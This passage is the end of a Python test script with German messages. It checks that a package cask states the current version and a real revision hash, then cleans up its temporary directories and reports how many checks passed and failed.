check("M3 Cask nennt die Version dieses Stands", bool(cask_version) and cask_version.group(1) == mm.VERSION, cask_version and cask_version.group(1))
check("M4 die Revision im Cask ist gesetzt (nicht der Platzhalter)", "0" * 40 not in cask_text)

for path in TMPDIRS:
    shutil.rmtree(path, ignore_errors=True)
print("\n%d bestanden, %d fehlgeschlagen" % (RESULTS["pass"], RESULTS["fail"]))
sys.exit(1 if RESULTS["fail"] else 0)
